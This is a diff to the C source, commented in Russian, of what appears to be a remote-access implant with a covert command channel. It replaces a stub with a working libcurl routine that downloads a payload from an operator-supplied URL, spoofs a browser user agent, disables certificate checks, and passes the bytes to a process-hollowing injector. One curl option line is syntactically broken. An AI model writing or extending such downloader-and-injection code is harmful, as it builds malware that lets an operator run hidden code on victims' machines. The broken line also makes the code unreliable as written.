@@ -23,6 +23,11 @@
 #include <arpa/inet.h>
 #endif
 
+// Включаем libcurl, если доступен
+#ifdef USE_LIBCURL
+#include <curl/curl.h>
+#endif
+
 #include "network/covert_channel.h"
 #include "../include/crypto_utils.h" // Предполагаем, что он есть для шифрования
 #include "../include/command_executor.h" // Добавляем исполнитель команд
@@ -198,6 +203,116 @@ CovertChannelHandle create_channel(const ZondParams *params) {
     return handle;
 }
 
+// Структура для записи данных от libcurl в память
+typedef struct {
+    unsigned char *buffer;
+    size_t size;
+    size_t capacity;
+} MemoryBuffer;
+
+// Callback-функция для записи данных от libcurl
+static size_t write_memory_callback(void *contents, size_t size, size_t nmemb, void *userp) {
+    size_t realsize = size * nmemb;
+    MemoryBuffer *mem = (MemoryBuffer *)userp;
+
+    // Увеличиваем буфер при необходимости
+    if (mem->capacity == 0) { // Начальная инициализация
+         mem->capacity = realsize > 1024 ? realsize * 2 : 1024; // Начнем с разумного размера
+         mem->buffer = (unsigned char *)malloc(mem->capacity);
+         if (mem->buffer == NULL) {
+             fprintf(stderr, "[Download] Ошибка malloc!\n");
+             return 0;
+         }
+         mem->size = 0;
+    } else if (mem->size + realsize + 1 > mem->capacity) {
+        size_t new_capacity = mem->capacity * 2;
+        if (new_capacity < mem->size + realsize + 1) {
+            new_capacity = mem->size + realsize + 1;
+        }
+        unsigned char *new_buffer = (unsigned char *)realloc(mem->buffer, new_capacity);
+        if(new_buffer == NULL) {
+            fprintf(stderr, "[Download] Ошибка realloc! Недостаточно памяти!\n");
+            // Не освобождаем старый буфер, т.к. данные еще могут быть нужны
+            return 0; // Сигнализируем об ошибке
+        }
+        mem->buffer = new_buffer;
+        mem->capacity = new_capacity;
+    }
+
+    if (mem->buffer) { // Проверка после malloc/realloc
+        memcpy(&(mem->buffer[mem->size]), contents, realsize);
+        mem->size += realsize;
+        mem->buffer[mem->size] = 0; // Завершаем строку нулем (на всякий случай)
+    } else {
+        return 0; // Ошибка выделения памяти
+    }
+
+    return realsize;
+}
+
+// Функция для скачивания payload по URL
+static unsigned char* download_payload(const char* url, size_t* payload_size) {
+#ifndef USE_LIBCURL
+    fprintf(stderr, "[Download] Ошибка: Поддержка libcurl не включена при компиляции (USE_LIBCURL не определен).\n");
+    *payload_size = 0;
+    return NULL;
+#else
+    CURL *curl_handle;
+    CURLcode res;
+    MemoryBuffer chunk;
+
+    // Инициализируем буфер
+    chunk.buffer = NULL; 
+    chunk.size = 0;
+    chunk.capacity = 0;
+
+    curl_global_init(CURL_GLOBAL_ALL);
+    curl_handle = curl_easy_init();
+    if(curl_handle) {
+        curl_easy_setopt(curl_handle, CURLOPT_URL, url);
+        curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_memory_callback);
+        curl_handle, CURLOPT_WRITEDATA, (void *)&chunk);
+        curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"); // Легитимный User-agent
+        curl_easy_setopt(curl_handle, CURLOPT_FOLLOWLOCATION, 1L); // Следовать редиректам
+        curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYPEER, 0L); // Отключить проверку SSL (НЕБЕЗОПАСНО! Для простоты)
+        curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYHOST, 0L); // Отключить проверку имени хоста SSL (НЕБЕЗОПАСНО!)
+        curl_easy_setopt(curl_handle, CURLOPT_TIMEOUT, 60L); // Таймаут 60 сек
+        curl_easy_setopt(curl_handle, CURLOPT_VERBOSE, 0L); // Отключить verbose вывод curl
+
+        printf("[Download] Скачиваем payload с %s...\n", url);
+        res = curl_easy_perform(curl_handle);
+
+        if(res != CURLE_OK) {
+            fprintf(stderr, "[Download] Ошибка curl_easy_perform(): %s\n", curl_easy_strerror(res));
+            if (chunk.buffer) free(chunk.buffer);
+            *payload_size = 0;
+        } else {
+            long http_code = 0;
+            curl_easy_getinfo(curl_handle, CURLINFO_RESPONSE_CODE, &http_code);
+            if (http_code >= 200 && http_code < 300) { // Успешные коды 2xx
+                printf("[Download] Скачано %zu байт (HTTP %ld).\n", chunk.size, http_code);
+                *payload_size = chunk.size;
+            } else {
+                 fprintf(stderr, "[Download] Ошибка HTTP: код %ld\n", http_code);
+                 if (chunk.buffer) free(chunk.buffer);
+                 chunk.buffer = NULL;
+                 *payload_size = 0;
+            }
+        }
+        curl_easy_cleanup(curl_handle);
+    } else {
+         fprintf(stderr, "[Download] Ошибка curl_easy_init()\n");
+         if (chunk.buffer) free(chunk.buffer);
+         chunk.buffer = NULL;
+         *payload_size = 0;
+    }
+
+    curl_global_cleanup();
+    // Возвращаем буфер (даже если он NULL в случае ошибки)
+    return chunk.buffer; 
+#endif
+}
+
 /**
  * @brief Обработка полученной команды с использованием command_executor
  * 
@@ -218,7 +333,7 @@ int process_command(const char *command, char *response, size_t max_response_siz
     if (command == NULL || response == NULL || max_response_size == 0) {
         return -1;
     }
-    
+
     CommandType cmd_type = COMMAND_TYPE_SHELL; // По умолчанию SHELL
     const char* cmd_line = command;
     int response_len = 0;
@@ -237,14 +352,17 @@ int process_command(const char *command, char *response, size_t max_response_siz
         if (sscanf(command + 7, "%259s %1023s", target_path, payload_url) == 2) {
             printf("[Main] Debug: Parsed HOLLOW command: target='%s', url='%s'\n", target_path, payload_url);
 
-            // TODO: Скачать payload по payload_url
-            unsigned char* payload_data = (unsigned char*)"PAYLOAD_PLACEHOLDER"; // ЗАГЛУШКА
-            size_t payload_size = strlen((char*)payload_data);
-            printf("[Main] Warning: Payload download is a STUB! Using placeholder.\n");
+            // Скачиваем payload по payload_url
+            size_t payload_size = 0;
+            unsigned char* payload_data = download_payload(payload_url, &payload_size);
 
-            int inject_result = inject_hollow_process(target_path, payload_data, payload_size);
-            snprintf(response, max_response_size, "HOLLOW_RESULT:%d", inject_result);
-            // TODO: Освободить payload_data, если он был скачан
+            if (payload_data != NULL && payload_size > 0) {
+                int inject_result = inject_hollow_process(target_path, payload_data, payload_size);
+                snprintf(response, max_response_size, "HOLLOW_RESULT:%d", inject_result);
+                free(payload_data); // Освобождаем память после использования
+            } else {
+                 snprintf(response, max_response_size, "ERROR: Failed to download payload from %s", payload_url);
+            }
 
         } else {
             snprintf(response, max_response_size, "ERROR: Invalid HOLLOW command format.");
